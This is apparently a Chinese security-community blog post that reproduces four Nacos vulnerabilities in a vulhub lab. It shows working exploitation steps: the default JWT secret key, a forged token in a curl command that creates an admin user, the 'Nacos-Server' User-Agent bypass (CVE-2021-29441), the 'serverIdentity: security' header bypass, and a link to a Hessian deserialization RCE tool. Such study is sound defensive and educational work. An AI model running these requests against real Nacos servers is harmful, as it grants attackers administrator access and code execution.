

# nacos相关漏洞学习 - 先知社区

nacos相关漏洞学习

- - -

# 目录

JWT\_Secret\_Key硬编码导致的认证绕过漏洞(**QVD-2023-6271**)  
不当处理User-Agent导致的认证绕过漏洞(**CVE-2021-29441**)  
identity key value 硬编码权限绕过  
Hessian 反序列化 RCE

## 环境搭建

为了方便直接用vulhub  
版本：NACOS v1.4.0

```plain
cd vulhub-master\nacos\CVE-2021-29441 
docker compose up -d
docker compose restart nacos
```

某些情况下nacos服务会启动失败（无法连接数据库导致），可以重启nacos服务或者重启所有服务 访问[http://127.0.0.1:8848/nacos/#/login](http://127.0.0.1:8848/nacos/#/login)

[![](assets/1703209824-2d8a973e407cd505da457773ff138e04.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231221190451-c330f3ce-9ff0-1.png)

默认账号密码都是nacos

[![](assets/1703209824-49c255f46ed8640299b5674909229ad1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231221190521-d53a93a4-9ff0-1.png)

## JWT\_Secret\_Key硬编码身份验证绕过

尽管设置了 `NACOS_AUTH_ENABLE=true` 和自定义的 `NACOS_AUTH_TOKEN`，自定义的 token 并未生效，用户仍需使用默认的 `secret.key` 来生成可访问 API 接口的 `access_token`。预期是使用自定义的 `NACOS_AUTH_TOKEN` 来生成并使用 `access_token`，但实际上仍需要依赖默认的 `secret.key`

在application.properties中可以看到  
secret.key的值默认为SecretKey012345678901234567890123456789012345678901234567890123456789  
[![](assets/1703209824-5dbc205406a2b9b90df358f771e2922f.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231221205010-799c54ce-9fff-1.png)

[![](assets/1703209824-0201955bf5a50d4eb7f31298131a205e.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231221190617-f6eee5cc-9ff0-1.png)

在得到key的值后我们可以任意伪造jwt

[![](assets/1703209824-0c761f4933ce1c3a6db69ff39e710073.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231221190624-fafdbf94-9ff0-1.png)

`curl -XPOST 'http://ip:8848/nacos/v1/auth/users/?accessToken=eyJhbGciOiJIUzUxMiJ9.eyJzdWIiOiJuYWNvcyIsImV4cCI6IjI2MTYyMzkwMjIifQ.5aXePQdHbh9hKNoj_qqCC4x6PzbXmpy-vYQHhi0PdjVHyDJ40Ge6CVz6AWuV1UHa4H8-A-LXMOqQGSXjrsJ8HQ&username=admin&password=123456'`  
访问接口 创建一个admin用户 密码123456

## 不当处理User-Agent导致的认证绕过漏洞(CVE-2021-29441)

版本: <=Nacos 1.4.1 配置为使用身份验证（-Dnacos.core.auth.enabled=true）  
nacos在进行认证授权操作时，会判断请求的user-agent是否为”Nacos-Server”，如果是的话则不进行任何认证 可调用敏感接口

list用户接口  
[http://ip:8848/nacos/v1/auth/users?pageNo=1&pageSize=1](http://ip:8848/nacos/v1/auth/users?pageNo=1&pageSize=1)  
获取当前用户列表以及密码  
直接访问会403

[![](assets/1703209824-6c5b4ac19b3d0a30a823a79e382f4ad8.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231221190634-00b7718c-9ff1-1.png)

将user-agent头修改为Nacos-Server即可绕过

[![](assets/1703209824-051257fdbc4fc6d9f0c9cea723720638.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231221190640-04a43d66-9ff1-1.png)

添加用户接口：  
POST  
/nacos/v1/auth/users?username=admin&password=123456  
User-Agent: Nacos-Server  
pageNo=1&pageSize=9

[![](assets/1703209824-0e6699861cdef5d29a1d3fc3dc172d5b.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231221190648-08f10340-9ff1-1.png)

创建登录成功

## identity key value 硬编码权限绕过

影响版本：Nacos <= 2.2.0 nacos.core.auth.enabled=true  
当请求头携带"serverIdentity:security"时 可绕过权限认证

[![](assets/1703209824-0ee9151d9e43c5b3368b3cba2de7041d.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231221190654-0cec4c34-9ff1-1.png)

[![](assets/1703209824-46808b6c57397104952697ddaa9568ad.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231221190704-12fbd482-9ff1-1.png)

[https://github.com/alibaba/nacos/blob/d40190ee24af94fa87414b88239c47693c524333/core/src/main/java/com/alibaba/nacos/core/auth/AuthFilter.java#L65](https://github.com/alibaba/nacos/blob/d40190ee24af94fa87414b88239c47693c524333/core/src/main/java/com/alibaba/nacos/core/auth/AuthFilter.java#L65)

检查`authConfigs`对象中是否设置了`serverIdentityKey`和`serverIdentityValue` 如果这两个配置项都非空，代码会从HTTP请求的头部获取服务器身份信息 再对比header中value的值和配置文件中nacos.core.auth.server.identity.value的值是否相同，如果相同则通过权限校验

利用：  
添加用户接口  
`curl -XPOST 'http://ip:8848/nacos/v1/auth/users?username=admin2&password=123456' -H "serverIdentity: security"`

## Hessian 反序列化 RCE

1.4.0 <= Nacos < 1.4.6 2.0.0 <= Nacos < 2.2.3  
Nacos默认的7848端口是用于Nacos集群间Raft协议的通信，该端口的服务在处理部分Jraft请求时会使用Hessian进行反序列化

[![](assets/1703209824-8da499438e2fe0e18b9f519192034662.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231221190716-19db83ec-9ff1-1.png)

[https://github.com/c0olw/NacosRce](https://github.com/c0olw/NacosRce)  
直接用大佬的工具一把嗦
